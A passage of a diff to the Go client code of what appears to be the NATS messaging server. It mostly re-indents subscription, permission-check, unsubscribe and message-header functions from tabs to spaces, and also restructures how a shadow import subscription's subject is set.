!ime.dyn {\n-\t\tif ime.overlapSubj != _EMPTY_ {\n-\t\t\tnsub.subject = []byte(ime.overlapSubj)\n-\t\t} else {\n-\t\t\tnsub.subject = []byte(im.from)\n-\t\t}\n-\t}\n-\t// Else use original subject\n-\tc.Debugf(\"Creating import subscription on %q from account %q\", nsub.subject, im.acc.Name)\n-\n-\tif err := im.acc.sl.Insert(&nsub); err != nil {\n-\t\terrs := fmt.Sprintf(\"Could not add shadow import subscription for account %q\", im.acc.Name)\n-\t\tc.Debugf(errs)\n-\t\treturn nil, fmt.Errorf(errs)\n-\t}\n-\n-\t// Update our route map here.\n-\tc.srv.updateRemoteSubscription(im.acc, &nsub, 1)\n-\n-\treturn &nsub, nil\n+        im := ime.im\n+        nsub := *sub // copy\n+        nsub.im = im\n+\n+        if !im.usePub && ime.dyn {\n+                if im.rtr == nil {\n+                        im.rtr = im.tr.reverse()\n+                }\n+                s := string(nsub.subject)\n+                if ime.overlapSubj != _EMPTY_ {\n+                        s = ime.overlapSubj\n+                }\n+                subj, err := im.rtr.transformSubject(s)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                nsub.subject = []byte(subj)\n+        } else if !im.usePub || !ime.dyn {\n+                if ime.overlapSubj != _EMPTY_ {\n+                        nsub.subject = []byte(ime.overlapSubj)\n+                } else {\n+                        nsub.subject = []byte(im.from)\n+                }\n+        }\n+        // Else use original subject\n+        c.Debugf(\"Creating import subscription on %q from account %q\", nsub.subject, im.acc.Name)\n+\n+        if err := im.acc.sl.Insert(&nsub); err != nil {\n+                errs := fmt.Sprintf(\"Could not add shadow import subscription for account %q\", im.acc.Name)\n+                c.Debugf(errs)\n+                return nil, fmt.Errorf(errs)\n+        }\n+\n+        // Update our route map here.\n+        c.srv.updateRemoteSubscription(im.acc, &nsub, 1)\n+\n+        return &nsub, nil\n }\n \n // canSubscribe determines if the client is authorized to subscribe to the\n // given subject. Assumes caller is holding lock.\n func (c *client) canSubscribe(subject string) bool {\n-\tif c.perms == nil {\n-\t\treturn true\n-\t}\n-\n-\tallowed := true\n-\n-\t// Check allow list. If no allow list that means all are allowed. Deny can overrule.\n-\tif c.perms.sub.allow != nil {\n-\t\tr := c.perms.sub.allow.Match(subject)\n-\t\tallowed = len(r.psubs) != 0\n-\t\t// Leafnodes operate slightly differently in that they allow broader scoped subjects.\n-\t\t// They will prune based on publish perms before sending to a leafnode client.\n-\t\tif !allowed && c.kind == LEAF && subjectHasWildcard(subject) {\n-\t\t\tr := c.perms.sub.allow.ReverseMatch(subject)\n-\t\t\tallowed = len(r.psubs) != 0\n-\t\t}\n-\t}\n-\t// If we have a deny list and we think we are allowed, check that as well.\n-\tif allowed && c.perms.sub.deny != nil {\n-\t\tr := c.perms.sub.deny.Match(subject)\n-\t\tallowed = len(r.psubs) == 0\n-\n-\t\t// We use the actual subscription to signal us to spin up the deny mperms\n-\t\t// and cache. We check if the subject is a wildcard that contains any of\n-\t\t// the deny clauses.\n-\t\t// FIXME(dlc) - We could be smarter and track when these go away and remove.\n-\t\tif allowed && c.mperms == nil && subjectHasWildcard(subject) {\n-\t\t\t// Whip through the deny array and check if this wildcard subject is within scope.\n-\t\t\tfor _, sub := range c.darray {\n-\t\t\t\tif subjectIsSubsetMatch(sub, subject) {\n-\t\t\t\t\tc.loadMsgDenyFilter()\n-\t\t\t\t\tbreak\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn allowed\n+        if c.perms == nil {\n+                return true\n+        }\n+\n+        allowed := true\n+\n+        // Check allow list. If no allow list that means all are allowed. Deny can overrule.\n+        if c.perms.sub.allow != nil {\n+                r := c.perms.sub.allow.Match(subject)\n+                allowed = len(r.psubs) != 0\n+                // Leafnodes operate slightly differently in that they allow broader scoped subjects.\n+                // They will prune based on publish perms before sending to a leafnode client.\n+                if !allowed && c.kind == LEAF && subjectHasWildcard(subject) {\n+                        r := c.perms.sub.allow.ReverseMatch(subject)\n+                        allowed = len(r.psubs) != 0\n+                }\n+        }\n+        // If we have a deny list and we think we are allowed, check that as well.\n+        if allowed && c.perms.sub.deny != nil {\n+                r := c.perms.sub.deny.Match(subject)\n+                allowed = len(r.psubs) == 0\n+\n+                // We use the actual subscription to signal us to spin up the deny mperms\n+                // and cache. We check if the subject is a wildcard that contains any of\n+                // the deny clauses.\n+                // FIXME(dlc) - We could be smarter and track when these go away and remove.\n+                if allowed && c.mperms == nil && subjectHasWildcard(subject) {\n+                        // Whip through the deny array and check if this wildcard subject is within scope.\n+                        for _, sub := range c.darray {\n+                                if subjectIsSubsetMatch(sub, subject) {\n+                                        c.loadMsgDenyFilter()\n+                                        break\n+                                }\n+                        }\n+                }\n+        }\n+        return allowed\n }\n \n func queueMatches(queue string, qsubs [][]*subscription) bool {\n-\tif len(qsubs) == 0 {\n-\t\treturn true\n-\t}\n-\tfor _, qsub := range qsubs {\n-\t\tqs := qsub[0]\n-\t\tqname := string(qs.queue)\n-\n-\t\t// NOTE: '*' and '>' tokens can also be valid\n-\t\t// queue names so we first check against the\n-\t\t// literal name.  e.g. v1.* == v1.*\n-\t\tif queue == qname || (subjectHasWildcard(qname) && subjectIsSubsetMatch(queue, qname)) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        if len(qsubs) == 0 {\n+                return true\n+        }\n+        for _, qsub := range qsubs {\n+                qs := qsub[0]\n+                qname := string(qs.queue)\n+\n+                // NOTE: '*' and '>' tokens can also be valid\n+                // queue names so we first check against the\n+                // literal name.  e.g. v1.* == v1.*\n+                if queue == qname || (subjectHasWildcard(qname) && subjectIsSubsetMatch(queue, qname)) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n func (c *client) canQueueSubscribe(subject, queue string) bool {\n-\tif c.perms == nil {\n-\t\treturn true\n-\t}\n+        if c.perms == nil {\n+                return true\n+        }\n \n-\tallowed := true\n+        allowed := true\n \n-\tif c.perms.sub.allow != nil {\n-\t\tr := c.perms.sub.allow.Match(subject)\n+        if c.perms.sub.allow != nil {\n+                r := c.perms.sub.allow.Match(subject)\n \n-\t\t// If perms DO NOT have queue name, then psubs will be greater than\n-\t\t// zero. If perms DO have queue name, then qsubs will be greater than\n-\t\t// zero.\n-\t\tallowed = len(r.psubs) > 0\n-\t\tif len(r.qsubs) > 0 {\n-\t\t\t// If the queue appears in the allow list, then DO allow.\n-\t\t\tallowed = queueMatches(queue, r.qsubs)\n-\t\t}\n-\t}\n+                // If perms DO NOT have queue name, then psubs will be greater than\n+                // zero. If perms DO have queue name, then qsubs will be greater than\n+                // zero.\n+                allowed = len(r.psubs) > 0\n+                if len(r.qsubs) > 0 {\n+                        // If the queue appears in the allow list, then DO allow.\n+                        allowed = queueMatches(queue, r.qsubs)\n+                }\n+        }\n \n-\tif allowed && c.perms.sub.deny != nil {\n-\t\tr := c.perms.sub.deny.Match(subject)\n+        if allowed && c.perms.sub.deny != nil {\n+                r := c.perms.sub.deny.Match(subject)\n \n-\t\t// If perms DO NOT have queue name, then psubs will be greater than\n-\t\t// zero. If perms DO have queue name, then qsubs will be greater than\n-\t\t// zero.\n-\t\tallowed = len(r.psubs) == 0\n-\t\tif len(r.qsubs) > 0 {\n-\t\t\t// If the queue appears in the deny list, then DO NOT allow.\n-\t\t\tallowed = !queueMatches(queue, r.qsubs)\n-\t\t}\n-\t}\n+                // If perms DO NOT have queue name, then psubs will be greater than\n+                // zero. If perms DO have queue name, then qsubs will be greater than\n+                // zero.\n+                allowed = len(r.psubs) == 0\n+                if len(r.qsubs) > 0 {\n+                        // If the queue appears in the deny list, then DO NOT allow.\n+                        allowed = !queueMatches(queue, r.qsubs)\n+                }\n+        }\n \n-\treturn allowed\n+        return allowed\n }\n \n // Low level unsubscribe for a given client.\n func (c *client) unsubscribe(acc *Account, sub *subscription, force, remove bool) {\n-\tc.mu.Lock()\n-\tif !force && sub.max > 0 && sub.nm < sub.max {\n-\t\tc.Debugf(\n-\t\t\t\"Deferring actual UNSUB(%s): %d max, %d received\",\n-\t\t\tstring(sub.subject), sub.max, sub.nm)\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\n-\tif c.trace {\n-\t\tc.traceOp(\"<-> %s\", \"DELSUB\", sub.sid)\n-\t}\n-\n-\tif c.kind != CLIENT && c.kind != SYSTEM {\n-\t\tc.removeReplySubTimeout(sub)\n-\t}\n-\n-\t// Remove accounting if requested. This will be false when we close a connection\n-\t// with open subscriptions.\n-\tif remove {\n-\t\tdelete(c.subs, string(sub.sid))\n-\t\tif acc != nil {\n-\t\t\tacc.sl.Remove(sub)\n-\t\t}\n-\t}\n-\n-\t// Check to see if we have shadow subscriptions.\n-\tvar updateRoute bool\n-\tvar updateGWs bool\n-\tshadowSubs := sub.shadow\n-\tsub.shadow = nil\n-\tif len(shadowSubs) > 0 {\n-\t\tupdateRoute = (c.kind == CLIENT || c.kind == SYSTEM || c.kind == LEAF) && c.srv != nil\n-\t\tif updateRoute {\n-\t\t\tupdateGWs = c.srv.gateway.enabled\n-\t\t}\n-\t}\n-\tsub.close()\n-\tc.mu.Unlock()\n-\n-\t// Process shadow subs if we have them.\n-\tfor _, nsub := range shadowSubs {\n-\t\tif err := nsub.im.acc.sl.Remove(nsub); err != nil {\n-\t\t\tc.Debugf(\"Could not remove shadow import subscription for account %q\", nsub.im.acc.Name)\n-\t\t} else {\n-\t\t\tif updateRoute {\n-\t\t\t\tc.srv.updateRouteSubscriptionMap(nsub.im.acc, nsub, -1)\n-\t\t\t}\n-\t\t\tif updateGWs {\n-\t\t\t\tc.srv.gatewayUpdateSubInterest(nsub.im.acc.Name, nsub, -1)\n-\t\t\t}\n-\t\t}\n-\t\t// Now check on leafnode updates.\n-\t\tc.srv.updateLeafNodes(nsub.im.acc, nsub, -1)\n-\t}\n-\n-\t// Now check to see if this was part of a respMap entry for service imports.\n-\tif acc != nil {\n-\t\tacc.checkForReverseEntry(string(sub.subject), nil, true)\n-\t}\n+        c.mu.Lock()\n+        if !force && sub.max > 0 && sub.nm < sub.max {\n+                c.Debugf(\n+                        \"Deferring actual UNSUB(%s): %d max, %d received\",\n+                        string(sub.subject), sub.max, sub.nm)\n+                c.mu.Unlock()\n+                return\n+        }\n+\n+        if c.trace {\n+                c.traceOp(\"<-> %s\", \"DELSUB\", sub.sid)\n+        }\n+\n+        if c.kind != CLIENT && c.kind != SYSTEM {\n+                c.removeReplySubTimeout(sub)\n+        }\n+\n+        // Remove accounting if requested. This will be false when we close a connection\n+        // with open subscriptions.\n+        if remove {\n+                delete(c.subs, string(sub.sid))\n+                if acc != nil {\n+                        acc.sl.Remove(sub)\n+                }\n+        }\n+\n+        // Check to see if we have shadow subscriptions.\n+        var updateRoute bool\n+        var updateGWs bool\n+        shadowSubs := sub.shadow\n+        sub.shadow = nil\n+        if len(shadowSubs) > 0 {\n+                updateRoute = (c.kind == CLIENT || c.kind == SYSTEM || c.kind == LEAF) && c.srv != nil\n+                if updateRoute {\n+                        updateGWs = c.srv.gateway.enabled\n+                }\n+        }\n+        sub.close()\n+        c.mu.Unlock()\n+\n+        // Process shadow subs if we have them.\n+        for _, nsub := range shadowSubs {\n+                if err := nsub.im.acc.sl.Remove(nsub); err != nil {\n+                        c.Debugf(\"Could not remove shadow import subscription for account %q\", nsub.im.acc.Name)\n+                } else {\n+                        if updateRoute {\n+                                c.srv.updateRouteSubscriptionMap(nsub.im.acc, nsub, -1)\n+                        }\n+                        if updateGWs {\n+                                c.srv.gatewayUpdateSubInterest(nsub.im.acc.Name, nsub, -1)\n+                        }\n+                }\n+                // Now check on leafnode updates.\n+                c.srv.updateLeafNodes(nsub.im.acc, nsub, -1)\n+        }\n+\n+        // Now check to see if this was part of a respMap entry for service imports.\n+        if acc != nil {\n+                acc.checkForReverseEntry(string(sub.subject), nil, true)\n+        }\n }\n \n func (c *client) processUnsub(arg []byte) error {\n-\targs := splitArg(arg)\n-\tvar sid []byte\n-\tmax := int64(-1)\n-\n-\tswitch len(args) {\n-\tcase 1:\n-\t\tsid = args[0]\n-\tcase 2:\n-\t\tsid = args[0]\n-\t\tmax = int64(parseSize(args[1]))\n-\tdefault:\n-\t\treturn fmt.Errorf(\"processUnsub Parse Error: '%s'\", arg)\n-\t}\n-\n-\tvar sub *subscription\n-\tvar ok, unsub bool\n-\n-\tc.mu.Lock()\n-\n-\t// Indicate activity.\n-\tc.in.subs++\n-\n-\t// Grab connection type.\n-\tkind := c.kind\n-\tsrv := c.srv\n-\tvar acc *Account\n-\n-\tupdateGWs := false\n-\tif sub, ok = c.subs[string(sid)]; ok {\n-\t\tacc = c.acc\n-\t\tif max > 0 && max > sub.nm {\n-\t\t\tsub.max = max\n-\t\t} else {\n-\t\t\t// Clear it here to override\n-\t\t\tsub.max = 0\n-\t\t\tunsub = true\n-\t\t}\n-\t\tupdateGWs = srv.gateway.enabled\n-\t}\n-\tc.mu.Unlock()\n-\n-\tif c.opts.Verbose {\n-\t\tc.sendOK()\n-\t}\n-\n-\tif unsub {\n-\t\tc.unsubscribe(acc, sub, false, true)\n-\t\tif acc != nil && (kind == CLIENT || kind == SYSTEM || kind == ACCOUNT || kind == JETSTREAM) {\n-\t\t\tsrv.updateRouteSubscriptionMap(acc, sub, -1)\n-\t\t\tif updateGWs {\n-\t\t\t\tsrv.gatewayUpdateSubInterest(acc.Name, sub, -1)\n-\t\t\t}\n-\t\t}\n-\t\t// Now check on leafnode updates.\n-\t\tsrv.updateLeafNodes(acc, sub, -1)\n-\t}\n-\n-\treturn nil\n+        args := splitArg(arg)\n+        var sid []byte\n+        max := int64(-1)\n+\n+        switch len(args) {\n+        case 1:\n+                sid = args[0]\n+        case 2:\n+                sid = args[0]\n+                max = int64(parseSize(args[1]))\n+        default:\n+                return fmt.Errorf(\"processUnsub Parse Error: '%s'\", arg)\n+        }\n+\n+        var sub *subscription\n+        var ok, unsub bool\n+\n+        c.mu.Lock()\n+\n+        // Indicate activity.\n+        c.in.subs++\n+\n+        // Grab connection type.\n+        kind := c.kind\n+        srv := c.srv\n+        var acc *Account\n+\n+        updateGWs := false\n+        if sub, ok = c.subs[string(sid)]; ok {\n+                acc = c.acc\n+                if max > 0 && max > sub.nm {\n+                        sub.max = max\n+                } else {\n+                        // Clear it here to override\n+                        sub.max = 0\n+                        unsub = true\n+                }\n+                updateGWs = srv.gateway.enabled\n+        }\n+        c.mu.Unlock()\n+\n+        if c.opts.Verbose {\n+                c.sendOK()\n+        }\n+\n+        if unsub {\n+                c.unsubscribe(acc, sub, false, true)\n+                if acc != nil && (kind == CLIENT || kind == SYSTEM || kind == ACCOUNT || kind == JETSTREAM) {\n+                        srv.updateRouteSubscriptionMap(acc, sub, -1)\n+                        if updateGWs {\n+                                srv.gatewayUpdateSubInterest(acc.Name, sub, -1)\n+                        }\n+                }\n+                // Now check on leafnode updates.\n+                srv.updateLeafNodes(acc, sub, -1)\n+        }\n+\n+        return nil\n }\n \n // checkDenySub will check if we are allowed to deliver this message in the\n@@ -2904,165 +2906,165 @@ func (c *client) processUnsub(arg []byte) error {\n // larger scoped wildcard subscriptions, so we need to check at delivery time.\n // Lock should be held.\n func (c *client) checkDenySub(subject string) bool {\n-\tif denied, ok := c.mperms.dcache[subject]; ok {\n-\t\treturn denied\n-\t} else if r := c.mperms.deny.Match(subject); len(r.psubs) != 0 {\n-\t\tc.mperms.dcache[subject] = true\n-\t\treturn true\n-\t} else {\n-\t\tc.mperms.dcache[subject] = false\n-\t}\n-\tif len(c.mperms.dcache) > maxDenyPermCacheSize {\n-\t\tc.pruneDenyCache()\n-\t}\n-\treturn false\n+        if denied, ok := c.mperms.dcache[subject]; ok {\n+                return denied\n+        } else if r := c.mperms.deny.Match(subject); len(r.psubs) != 0 {\n+                c.mperms.dcache[subject] = true\n+                return true\n+        } else {\n+                c.mperms.dcache[subject] = false\n+        }\n+        if len(c.mperms.dcache) > maxDenyPermCacheSize {\n+                c.pruneDenyCache()\n+        }\n+        return false\n }\n \n // Create a message header for routes or leafnodes. Header and origin cluster aware.\n func (c *client) msgHeaderForRouteOrLeaf(subj, reply []byte, rt *routeTarget, acc *Account) []byte {\n-\thasHeader := c.pa.hdr > 0\n-\tcanReceiveHeader := rt.sub.client.headers\n-\n-\tmh := c.msgb[:msgHeadProtoLen]\n-\tkind := rt.sub.client.kind\n-\tvar lnoc bool\n-\n-\tif kind == ROUTER {\n-\t\t// If we are coming from a leaf with an origin cluster we need to handle differently\n-\t\t// if we can. We will send a route based LMSG which has origin cluster and headers\n-\t\t// by default.\n-\t\tif c.kind == LEAF && c.remoteCluster() != _EMPTY_ && rt.sub.client.route.lnoc {\n-\t\t\tmh[0] = 'L'\n-\t\t\tmh = append(mh, c.remoteCluster()...)\n-\t\t\tmh = append(mh, ' ')\n-\t\t\tlnoc = true\n-\t\t} else {\n-\t\t\t// Router (and Gateway) nodes are RMSG. Set here since leafnodes may rewrite.\n-\t\t\tmh[0] = 'R'\n-\t\t}\n-\t\tmh = append(mh, acc.Name...)\n-\t\tmh = append(mh, ' ')\n-\t} else {\n-\t\t// Leaf nodes are LMSG\n-\t\tmh[0] = 'L'\n-\t\t// Remap subject if its a shadow subscription, treat like a normal client.\n-\t\tif rt.sub.im != nil {\n-\t\t\tif rt.sub.im.tr != nil {\n-\t\t\t\tto, _ := rt.sub.im.tr.transformSubject(string(subj))\n-\t\t\t\tsubj = []byte(to)\n-\t\t\t} else if !rt.sub.im.usePub {\n-\t\t\t\tsubj = []byte(rt.sub.im.to)\n-\t\t\t}\n-\t\t}\n-\t}\n-\tmh = append(mh, subj...)\n-\tmh = append(mh, ' ')\n-\n-\tif len(rt.qs) > 0 {\n-\t\tif reply != nil {\n-\t\t\tmh = append(mh, \"+ \"...) // Signal that there is a reply.\n-\t\t\tmh = append(mh, reply...)\n-\t\t\tmh = append(mh, ' ')\n-\t\t} else {\n-\t\t\tmh = append(mh, \"| \"...) // Only queues\n-\t\t}\n-\t\tmh = append(mh, rt.qs...)\n-\t} else if reply != nil {\n-\t\tmh = append(mh, reply...)\n-\t\tmh = append(mh, ' ')\n-\t}\n-\n-\tif lnoc {\n-\t\t// leafnode origin LMSG always have a header entry even if zero.\n-\t\tif c.pa.hdr <= 0 {\n-\t\t\tmh = append(mh, '0')\n-\t\t} else {\n-\t\t\tmh = append(mh, c.pa.hdb...)\n-\t\t}\n-\t\tmh = append(mh, ' ')\n-\t\tmh = append(mh, c.pa.szb...)\n-\t} else if hasHeader {\n-\t\tif canReceiveHeader {\n-\t\t\tmh[0] = 'H'\n-\t\t\tmh = append(mh, c.pa.hdb...)\n-\t\t\tmh = append(mh, ' ')\n-\t\t\tmh = append(mh, c.pa.szb...)\n-\t\t} else {\n-\t\t\t// If we are here we need to truncate the payload size\n-\t\t\tnsz := strconv.Itoa(c.pa.size - c.pa.hdr)\n-\t\t\tmh = append(mh, nsz...)\n-\t\t}\n-\t} else {\n-\t\tmh = append(mh, c.pa.szb...)\n-\t}\n-\treturn append(mh, _CRLF_...)\n+        hasHeader := c.pa.hdr > 0\n+        canReceiveHeader := rt.sub.client.headers\n+\n+        mh := c.msgb[:msgHeadProtoLen]\n+        kind := rt.sub.client.kind\n+        var lnoc bool\n+\n+        if kind == ROUTER {\n+                // If we are coming from a leaf with an origin cluster we need to handle differently\n+                // if we can. We will send a route based LMSG which has origin cluster and headers\n+                // by default.\n+                if c.kind == LEAF && c.remoteCluster() != _EMPTY_ && rt.sub.client.route.lnoc {\n+                        mh[0] = 'L'\n+                        mh = append(mh, c.remoteCluster()...)\n+                        mh = append(mh, ' ')\n+                        lnoc = true\n+                } else {\n+                        // Router (and Gateway) nodes are RMSG. Set here since leafnodes may rewrite.\n+                        mh[0] = 'R'\n+                }\n+                mh = append(mh, acc.Name...)\n+                mh = append(mh, ' ')\n+        } else {\n+                // Leaf nodes are LMSG\n+                mh[0] = 'L'\n+                // Remap subject if its a shadow subscription, treat like a normal client.\n+                if rt.sub.im != nil {\n+                        if rt.sub.im.tr != nil {\n+                                to, _ := rt.sub.im.tr.transformSubject(string(subj))\n+                                subj = []byte(to)\n+                        } else if !rt.sub.im.usePub {\n+                                subj = []byte(rt.sub.im.to)\n+                        }\n+                }\n+        }\n+        mh = append(mh, subj...)\n+        mh = append(mh, ' ')\n+\n+        if len(rt.qs) > 0 {\n+                if reply != nil {\n+                        mh = append(mh, \"+ \"...) // Signal that there is a reply.\n+                        mh = append(mh, reply...)\n+                        mh = append(mh, ' ')\n+                } else {\n+                        mh = append(mh, \"| \"...) // Only queues\n+                }\n+                mh = append(mh, rt.qs...)\n+        } else if reply != nil {\n+                mh = append(mh, reply...)\n+                mh = append(mh, ' ')\n+        }\n+\n+        if lnoc {\n+                // leafnode origin LMSG always have a header entry even if zero.\n+                if c.pa.hdr <= 0 {\n+                        mh = append(mh, '0')\n+                } else {\n+                        mh = append(mh, c.pa.hdb...)\n+                }\n+                mh = append(mh, ' ')\n+                mh = append(mh, c.pa.szb...)\n+        } else if hasHeader {\n+                if canReceiveHeader {\n+                        mh[0] = 'H'\n+                        mh = append(mh, c.pa.hdb...)\n+                        mh = append(mh, ' ')\n+                        mh = append(mh, c.pa.szb...)\n+                } else {\n+                        // If we are here we need to truncate the payload size\n+                        nsz := strconv.Itoa(c.pa.size - c.pa.hdr)\n+                        mh = append(mh, nsz...)\n+                }\n+        } else {\n+                mh = append(mh, c.pa.szb...)\n+        }\n+        return append(mh, _CRLF_...)\n }\n \n // Create a message header for clients. Header aware.\n func (c *client) msgHeader(subj, reply []byte, sub *subscription) []byte {\n-\t// See if we should do headers. We have to have a headers msg and\n-\t// the client we are going to deliver to needs to support headers as well.\n-\thasHeader := c.pa.hdr > 0\n-\tcanReceiveHeader := sub.client != nil && sub.client.headers\n-\n-\tvar mh []byte\n-\tif hasHeader && canReceiveHeader {\n-\t\tmh = c.msgb[:msgHeadProtoLen]\n-\t\tmh[0] = 'H'\n-\t} else {\n-\t\tmh = c.msgb[1:msgHeadProtoLen]\n-\t}\n-\tmh = append(mh, subj...)\n-\tmh = append(mh, ' ')\n-\n-\tif len(sub.sid) > 0 {\n-\t\tmh = append(mh, sub.sid...)\n-\t\tmh = append(mh, ' ')\n-\t}\n-\tif reply != nil {\n-\t\tmh = append(mh, reply...)\n-\t\tmh = append(mh, ' ')\n-\t}\n-\tif hasHeader {\n-\t\tif canReceiveHeader {\n-\t\t\tmh = append(mh, c.pa.hdb...)\n-\t\t\tmh = append(mh, ' ')\n-\t\t\tmh = append(mh, c.pa.szb...)\n-\t\t} else {\n-\t\t\t// If we are here we need to truncate the payload size\n-\t\t\tnsz := strconv.Itoa(c.pa.size - c.pa.hdr)\n-\t\t\tmh = append(mh, nsz...)\n-\t\t}\n-\t} else {\n-\t\tmh = append(mh, c.pa.szb...)\n-\t}\n-\tmh = append(mh, _CRLF_...)\n-\treturn mh\n+        // See if we should do headers. We have to have a headers msg and\n+        // the client we are going to deliver to needs to support headers as well.\n+        hasHeader := c.pa.hdr > 0\n+        canReceiveHeader := sub.client != nil && sub.client.headers\n+\n+        var mh []byte\n+        if hasHeader && canReceiveHeader {\n+                mh = c.msgb[:msgHeadProtoLen]\n+                mh[0] = 'H'\n+        } else {\n+                mh = c.msgb[1:msgHeadProtoLen]\n+        }\n+        mh = append(mh, subj...)\n+        mh = append(mh, ' ')\n+\n+        if len(sub.sid) > 0 {\n+                mh = append(mh, sub.sid...)\n+                mh = append(mh, ' ')\n+        }\n+        if reply != nil {\n+                mh = append(mh, reply...)\n+                mh = append(mh, ' ')\n+        }\n+        if hasHeader {\n+                if canReceiveHeader {\n+                        mh = append(mh, c.pa.hdb...)\n+                        mh = append(mh, ' ')\n+                        mh = append(mh, c.pa.szb...)\n+                } else {\n+                        // If we are here we need to truncate the payload size\n+                        nsz := strconv.Itoa(c.pa.size - c.pa.hdr)\n+                        mh = append(mh, nsz...)\n+                }\n+        } else {\n+                mh = append(mh, c.pa.szb...)\n+        }\n+        mh = append(mh, _CRLF_...)\n+        return mh\n }\n \n func (c *client) stalledWait(producer *client) {\n-\tstall := c.out.stc\n-\tttl := stallDuration(c.out.pb, c.out.mp)\n-\tc.mu.Unlock()\n-\tdefer c.mu.Lock()\n+        stall := c.out.stc\n+        ttl := stallDuration(c.out.pb, c.out.mp)\n+        c.mu.Unlock()\n+        defer c.mu.Lock()\n \n-\tselect {\n-\tcase <-stall:\n-\tcase <-time.After(ttl):\n-\t\tproducer.Debugf(\"Timed out of fast producer stall (%v)\", ttl)\n-\t}\n+        select {\n+        case <-stall:\n+        case <-time.After(ttl):\n+                producer.Debugf(\"Timed out of fast producer stall (%v)\", ttl)\n+        }\n }\n \n func stallDuration(pb, mp int64) time.Duration {\n-\tttl := stallClientMinDuration\n-\tif pb >= mp {\n-\t\tttl = stallClientMaxDuration\n-\t} else if hmp := mp / 2; pb > hmp {\n-\t\tbsz := hmp / 10\n-\t\tadditional := int64(ttl) * ((pb - hmp) / bsz)\n-\t\tttl += time.Duration(additional)\n-\t}\n-\treturn ttl\n+        ttl := stallClientMinDuration\n+        if pb >= mp {\n+                ttl = stallClientMaxDuration\n+        } else if hmp := mp / 2; pb > hmp {\n+                bsz := hmp / 10\n+                additional := int64(ttl) * ((pb - hmp) / bsz)\n+                ttl += time.Duration(additional)\n+        }\n+        return ttl\n }\n \n // Used to treat maps as efficient set\n@@ -3071,202 +3073,202 @@ var needFlush = struct{}{}\n // deliverMsg will deliver a message to a matching subscription and its underlying client.\n // We process all connection/client types. mh is the part that will be protocol/client specific.\n func (c *client) deliverMsg(sub *subscription, acc *Account, subject, reply, mh, msg []byte, gwrply bool) bool {\n-\tif sub.client == nil {\n-\t\treturn false\n-\t}\n-\tclient := sub.client\n-\tclient.mu.Lock()\n-\n-\t// Check echo\n-\tif c == client && !client.echo {\n-\t\tclient.mu.Unlock()\n-\t\treturn false\n-\t}\n-\n-\t// Check if we have a subscribe deny clause. This will trigger us to check the subject\n-\t// for a match against the denied subjects.\n-\tif client.mperms != nil && client.checkDenySub(string(subject)) {\n-\t\tclient.mu.Unlock()\n-\t\treturn false\n-\t}\n-\n-\t// New race detector forces this now.\n-\tif sub.isClosed() {\n-\t\tclient.mu.Unlock()\n-\t\treturn false\n-\t}\n-\n-\t// Check if we are a leafnode and have perms to check.\n-\tif client.kind == LEAF && client.perms != nil {\n-\t\tif !client.pubAllowedFullCheck(string(subject), true, true) {\n-\t\t\tclient.mu.Unlock()\n-\t\t\tclient.Debugf(\"Not permitted to deliver to %q\", subject)\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\n-\tsrv := client.srv\n-\n-\tsub.nm++\n-\n-\t// Check if we should auto-unsubscribe.\n-\tif sub.max > 0 {\n-\t\tif client.kind == ROUTER && sub.nm >= sub.max {\n-\t\t\t// The only router based messages that we will see here are remoteReplies.\n-\t\t\t// We handle these slightly differently.\n-\t\t\tdefer client.removeReplySub(sub)\n-\t\t} else {\n-\t\t\t// For routing..\n-\t\t\tshouldForward := client.kind == CLIENT || client.kind == SYSTEM && client.srv != nil\n-\t\t\t// If we are at the exact number, unsubscribe but\n-\t\t\t// still process the message in hand, otherwise\n-\t\t\t// unsubscribe and drop message on the floor.\n-\t\t\tif sub.nm == sub.max {\n-\t\t\t\tclient.Debugf(\"Auto-unsubscribe limit of %d reached for sid '%s'\", sub.max, string(sub.sid))\n-\t\t\t\t// Due to defer, reverse the code order so that execution\n-\t\t\t\t// is consistent with other cases where we unsubscribe.\n-\t\t\t\tif shouldForward {\n-\t\t\t\t\tdefer srv.updateRemoteSubscription(client.acc, sub, -1)\n-\t\t\t\t}\n-\t\t\t\tdefer client.unsubscribe(client.acc, sub, true, true)\n-\t\t\t} else if sub.nm > sub.max {\n-\t\t\t\tclient.Debugf(\"Auto-unsubscribe limit [%d] exceeded\", sub.max)\n-\t\t\t\tclient.mu.Unlock()\n-\t\t\t\tclient.unsubscribe(client.acc, sub, true, true)\n-\t\t\t\tif shouldForward {\n-\t\t\t\t\tsrv.updateRemoteSubscription(client.acc, sub, -1)\n-\t\t\t\t}\n-\t\t\t\treturn false\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Check here if we have a header with our message. If this client can not\n-\t// support we need to strip the headers from the payload.\n-\t// The actual header would have been processed correctly for us, so just\n-\t// need to update payload.\n-\tif c.pa.hdr > 0 && !sub.client.headers {\n-\t\tmsg = msg[c.pa.hdr:]\n-\t}\n-\n-\t// Update statistics\n-\n-\t// The msg includes the CR_LF, so pull back out for accounting.\n-\tmsgSize := int64(len(msg))\n-\tprodIsMQTT := c.isMqtt()\n-\t// MQTT producers send messages without CR_LF, so don't remove it for them.\n-\tif !prodIsMQTT {\n-\t\tmsgSize -= int64(LEN_CR_LF)\n-\t}\n-\n-\t// No atomic needed since accessed under client lock.\n-\t// Monitor is reading those also under client's lock.\n-\tclient.outMsgs++\n-\tclient.outBytes += msgSize\n-\n-\t// Check for internal subscriptions.\n-\tif sub.icb != nil && !c.noIcb {\n-\t\tif gwrply {\n-\t\t\t// We will store in the account, not the client since it will likely\n-\t\t\t// be a different client that will send the reply.\n-\t\t\tsrv.trackGWReply(nil, client.acc, reply, c.pa.reply)\n-\t\t}\n-\t\tclient.mu.Unlock()\n-\n-\t\t// Internal account clients are for service imports and need the '\\r\\n'.\n-\t\tif client.kind == ACCOUNT {\n-\t\t\tsub.icb(sub, c, acc, string(subject), string(reply), msg)\n-\t\t} else {\n-\t\t\tsub.icb(sub, c, acc, string(subject), string(reply), msg[:msgSize])\n-\t\t}\n-\t\treturn true\n-\t}\n-\n-\t// We don't count internal deliveries so we update server statistics here.\n-\tatomic.AddInt64(&srv.outMsgs, 1)\n-\tatomic.AddInt64(&srv.outBytes, msgSize)\n-\n-\t// If we are a client and we detect that the consumer we are\n-\t// sending to is 